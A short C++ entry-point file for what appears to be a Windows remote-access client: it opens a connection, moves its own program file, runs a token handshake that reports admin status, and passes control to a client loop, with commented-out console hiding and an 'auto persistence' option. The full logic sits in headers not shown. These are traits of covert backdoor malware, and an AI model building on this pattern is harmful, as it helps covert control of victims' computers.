#include "../inc/Connexion.h"
#include "../inc/HandShake.h"
#include <windows.h>


int main()
{
    //-lws2_32
    //ShowWindow(GetConsoleWindow(),SW_HIDE);
   // cout <<" change test 1 " << endl;
    cout << "LEN MOD_PERSISTENCE:" << strlen("MOD_PERSISTENCE:") << endl;
    Connexion Client; //Declaration de l'object
    HandShake Handshake;

    //bool auto_persistence = false; //allows you to know if the auto persistence mode is active or not.

    Client.openConnexion();
    cout << "[+] Connected." << endl;


    cout << "Start connexion in startHandShake." << endl;
    cout << "[+] move prog go" << endl;
    Handshake.moveProg();
    cout << "[+] move prog finish" << endl;
    

    Handshake.setSock(Client.getSocket());
    Handshake.startHandShake();    
    cout << "[+] Handshake finished..." << endl;
    

    Client.setToken(Handshake.getToken());
    
    cout << "[+] client main go " << endl;
    Client.main(Handshake.getIsAdmin(), Handshake.getPathProg());    
    Client.closeConnexion();
    cout << "[+] Finished." << endl;
}